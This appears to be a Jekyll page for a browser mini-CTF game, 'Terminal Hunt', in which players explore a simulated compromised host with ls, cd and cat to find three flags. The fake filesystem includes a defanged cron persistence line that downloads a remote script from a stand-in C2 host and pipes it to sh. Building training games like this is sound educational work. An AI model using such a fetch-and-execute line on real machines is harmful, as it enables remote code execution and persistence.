---
layout: default
title: Terminal Hunt
permalink: /game/
description: "A mini terminal CTF. Find the flag hidden inside a compromised host before time runs out."
---

<div class="th-game">
  <div class="th-hud">
    <span class="th-hud-item">LEVEL <b id="th-level">1</b>/3</span>
    <span class="th-hud-item">FLAGS <b id="th-flags">0</b>/3</span>
    <span class="th-hud-item">TIME <b id="th-time">--</b></span>
    <button id="th-restart" class="th-btn" type="button">Restart</button>
  </div>

  <div class="th-terminal" id="th-terminal">
    <div class="th-bar"><span></span><span></span><span></span><em>analyst@breach-host: ~</em></div>
    <div class="th-out" id="th-out"></div>
  </div>

  <div class="th-prompt-row">
    <span class="th-prompt">analyst@breach-host:~$</span>
    <input id="th-input" type="text" autocomplete="off" spellcheck="false" placeholder="type a command... (help)">
  </div>

  <div class="th-modal" id="th-modal">
    <div class="th-modal-box">
      <h3 id="th-modal-title">Terminal Hunt</h3>
      <p id="th-modal-text">Three flags are hidden inside a compromised host. Use shell commands to explore, find them all as fast as you can. Type <code>help</code> to begin.</p>
      <button id="th-modal-btn" class="th-btn th-btn-primary" type="button">Start Hunt</button>
    </div>
  </div>
</div>

<script>
(function() {
  var LEVELS = [
    {
      story: "Level 1: a phishing dropper wrote a flag somewhere in the home directory.",
      fs: {
        "~": ["README.txt", "Downloads/", "Documents/", ".config/"],
        "~/Downloads": ["invoice.zip", "payload.txt"],
        "~/Documents": ["notes.txt"],
        "~/.config": ["backdoored.cfg"]
      },
      files: {
        "~/README.txt":         "Welcome to the breach host. Good luck.",
        "~/Downloads/invoice.zip": "[binary archive]",
        "~/Downloads/payload.txt": "stage2 loading... nothing here.",
        "~/Documents/notes.txt":   "TODO: rotate credentials (flag in dotfiles they said)",
        "~/.config/backdoored.cfg":"FLAG{p34c3_0f_c4k3}  <- level 1 flag"
      },
      hint: "Hidden files start with a dot. Check .config/"
    },
    {
      story: "Level 2: the implant dropped files deep in /var. Something logs everything.",
      fs: {
        "/": ["etc/", "var/", "tmp/"],
        "/etc": ["passwd", "cron.d/"],
        "/etc/cron.d": ["persistence.job"],
        "/var": ["log/"],
        "/var/log": ["auth.log", "implant.log"],
        "/tmp": ["cache.dat"]
      },
      files: {
        "/etc/passwd":                "root:x:0:0:root:/root:/bin/bash",
        "/etc/cron.d/persistence.job":"@reboot curl -s hxxp://c2.bad/x.sh | sh",
        "/var/log/auth.log":          "5 failed SSH attempts from 10.0.0.66",
        "/var/log/implant.log":       "beacon ok. FLAG{d33p_1n_th3_l0gs}  <- level 2 flag",
        "/tmp/cache.dat":             "zeroed out"
      },
      hint: "Logs live in /var/log/"
    },
    {
      story: "Level 3: final flag is in the attacker's vault, protected by a key.",
      fs: {
        "/": ["root/"],
        "/root": ["vault/", ".bash_history"],
        "/root/vault": ["vault.enc", "key.md"]
      },
      files: {
        "/root/.bash_history": "cat vault.enc ; echo key was moved",
        "/root/vault/vault.enc": "9f 4e 77 12 ... encrypted. need the key.",
        "/root/vault/key.md":  "FLAG{r00t_0f_4ll_3v1l}  <- level 3 flag (key: t3rm1nal)"
      },
      hint: "Bash history in /root reveals attacker habits"
    }
  ];

  var out    = document.getElementById('th-out');
  var input  = document.getElementById('th-input');
  var term   = document.getElementById('th-terminal');
  var modal  = document.getElementById('th-modal');
  var mTitle = document.getElementById('th-modal-title');
  var mText  = document.getElementById('th-modal-text');
  var mBtn   = document.getElementById('th-modal-btn');

  var li, flags, cwd, timer, seconds, playing = false;

  function el(tag, cls, text) {
    var e = document.createElement(tag);
    if (cls) e.className = cls;
    if (text !== undefined) e.textContent = text;
    return e;
  }

  function print(text, cls) {
    var line = el('div', 'th-line' + (cls ? ' ' + cls : ''), text);
    out.appendChild(line);
    term.scrollTop = term.scrollHeight;
  }

  function banner() {
    print("Terminal Hunt v1.0 - mini CTF", 'th-dim');
    print(LEVELS[li].story, 'th-accent');
    print("Commands: ls  cd <dir>  cat <file>  pwd  hint  clear", 'th-dim');
  }

  function norm(path) {
    if (!path) return cwd;
    var p = path, root, parts = [];
    if (p.charAt(0) === '~')      { root = '~';  p = p.slice(1); }
    else if (p.charAt(0) === '/') { root = '/';  p = p.slice(1); }
    else {
      root = cwd.charAt(0) === '~' ? '~' : '/';
      parts = (root === '~' ? cwd.slice(1) : cwd).split('/').filter(Boolean);
    }
    p.split('/').forEach(function(seg) {
      if (!seg || seg === '.') return;
      if (seg === '..') { parts.pop(); return; }
      parts.push(seg);
    });
    if (root === '/') return '/' + parts.join('/');
    return parts.length ? '~/' + parts.join('/') : '~';
  }

  function found() {
    flags++;
    document.getElementById('th-flags').textContent = flags;
    print("  [+] FLAG CAPTURED  (" + flags + "/3)", 'th-ok');
    if (li < LEVELS.length - 1) {
      li++;
      document.getElementById('th-level').textContent = li + 1;
      cwd = '';
      print("", '');
      banner();
    } else {
      win();
    }
  }

  function win() {
    playing = false;
    clearInterval(timer);
    mTitle.textContent = "All flags captured";
    mText.textContent = "You found 3 flags in " + seconds + " seconds. Post your time in the comments of any post.";
    modal.classList.add('open');
    input.blur();
  }

  function run(raw) {
    var parts = raw.trim().split(/\s+/);
    var cmd = parts[0], arg = parts[1] || '';
    var L = LEVELS[li];
    var key = norm(arg);

    if (cmd === 'clear') { out.innerHTML = ''; return; }
    if (cmd === 'pwd')   { print(cwd); return; }
    if (cmd === 'hint')  { print("  hint: " + L.hint, 'th-dim'); return; }
    if (cmd === 'help')  {
      print("  ls            list directory contents");
      print("  cat <file>    read a file");
      print("  cd <dir>      change directory (.. to go up)");
      print("  pwd           print working directory");
      print("  hint          nudge in the right direction");
      print("  clear         clear the screen");
      return;
    }
    if (cmd === 'ls') {
      var target = arg ? norm(arg) : cwd;
      var list = L.fs[target];
      if (!list) { print("  ls: cannot access '" + arg + "'", 'th-err'); return; }
      list.forEach(function(f) {
        var hidden = f.charAt(0) === '.';
        print("  " + f, f.indexOf('/') !== -1 ? 'th-dir' : (hidden ? 'th-hidden' : ''));
      });
      return;
    }
    if (cmd === 'cd') {
      if (arg === '' || arg === '~') { cwd = '~'; return; }
      var t = norm(arg);
      if (L.fs[t]) { cwd = t; return; }
      print("  cd: no such directory: " + arg, 'th-err');
      return;
    }
    if (cmd === 'cat') {
      var fkey = key;
      if (fkey === '') { print("  cat: missing file operand", 'th-err'); return; }
      if (L.files[fkey] !== undefined) {
        var content = L.files[fkey];
        print("  " + content);
        if (content.indexOf('FLAG{') !== -1) found();
        return;
      }
      print("  cat: " + arg + ": no such file", 'th-err');
      return;
    }
    if (cmd !== '') print("  " + cmd + ": command not found", 'th-err');
  }

  function tick() {
    seconds++;
    document.getElementById('th-time').textContent = seconds + 's';
  }

  function start() {
    li = 0; flags = 0; cwd = '~'; seconds = 0;
    document.getElementById('th-level').textContent = 1;
    document.getElementById('th-flags').textContent = 0;
    document.getElementById('th-time').textContent = '0s';
    out.innerHTML = '';
    banner();
    modal.classList.remove('open');
    playing = true;
    clearInterval(timer);
    timer = setInterval(tick, 1000);
    input.focus();
  }

  input.addEventListener('keydown', function(e) {
    if (e.key === 'Enter' && playing) {
      var v = input.value;
      print("analyst@breach-host:~$ " + v, 'th-cmd');
      run(v);
      input.value = '';
    }
  });

  term.addEventListener('click', function() { input.focus(); });
  mBtn.addEventListener('click', start);
  document.getElementById('th-restart').addEventListener('click', start);
})();
</script>

<style>
.th-game { position: relative; max-width: 860px; margin: 0 auto; }

.th-hud {
  display: flex; align-items: center; gap: 1.25rem;
  margin-bottom: 1rem; flex-wrap: wrap;
  font-family: 'JetBrains Mono', monospace; font-size: 0.8rem;
  color: var(--text-muted);
}
.th-hud b { color: var(--accent); }
.th-btn {
  font-family: inherit; font-size: 0.8rem; font-weight: 600;
  background: var(--bg2); color: var(--text);
  border: 1px solid var(--border); border-radius: 8px;
  padding: 0.35rem 1rem; cursor: pointer;
  transition: all 0.2s ease;
}
.th-btn:hover { border-color: var(--accent); color: var(--accent); }
.th-btn-primary {
  background: linear-gradient(135deg, #7aa2f7, #bb9af7);
  color: #1a1b2e; border: none;
  padding: 0.5rem 1.5rem;
}
.th-btn-primary:hover { opacity: 0.9; color: #1a1b2e; }

.th-terminal {
  background: #16161e;
  border: 1px solid #292e42;
  border-radius: 12px;
  overflow: hidden;
  box-shadow: 0 10px 40px rgba(0,0,0,0.35);
}
.th-bar {
  display: flex; align-items: center; gap: 6px;
  background: #1f2335; padding: 0.55rem 0.9rem;
}
.th-bar span { width: 11px; height: 11px; border-radius: 50%; background: #f7768e; }
.th-bar span:nth-child(2) { background: #e0af68; }
.th-bar span:nth-child(3) { background: #9ece6a; }
.th-bar em {
  margin-left: auto; font-style: normal;
  font-size: 0.72rem; color: #565f89;
  font-family: 'JetBrains Mono', monospace;
}
.th-out {
  padding: 1rem 1.1rem;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.82rem; line-height: 1.65;
  color: #c0caf5; min-height: 300px; max-height: 420px;
  overflow-y: auto;
}
.th-line { white-space: pre-wrap; }
.th-cmd  { color: #7dcfff; }
.th-dim  { color: #565f89; }
.th-dir  { color: #7aa2f7; font-weight: 600; }
.th-hidden { color: #bb9af7; }
.th-ok   { color: #9ece6a; font-weight: 700; }
.th-err  { color: #f7768e; }

.th-prompt-row {
  display: flex; align-items: center; gap: 0.6rem;
  margin-top: 0.9rem;
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 0.55rem 0.9rem;
}
.th-prompt {
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.8rem; color: #9ece6a; white-space: nowrap;
}
#th-input {
  flex: 1; border: none; outline: none; background: none;
  color: var(--text);
  font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;
}

.th-modal {
  display: none; position: fixed; inset: 0;
  background: rgba(10, 10, 20, 0.7);
  backdrop-filter: blur(4px);
  z-index: 9998;
  align-items: center; justify-content: center;
}
.th-modal.open { display: flex; }
.th-modal-box {
  background: var(--header-bg);
  border: 1px solid var(--border);
  border-radius: 16px;
  padding: 2rem 2.4rem;
  max-width: 420px; text-align: center;
  box-shadow: 0 20px 60px rgba(0,0,0,0.5);
}
.th-modal-box h3 { margin: 0 0 0.75rem; }
.th-modal-box p {
  font-size: 0.9rem; color: var(--text-muted); line-height: 1.6;
  margin: 0 0 1.4rem;
}
</style>
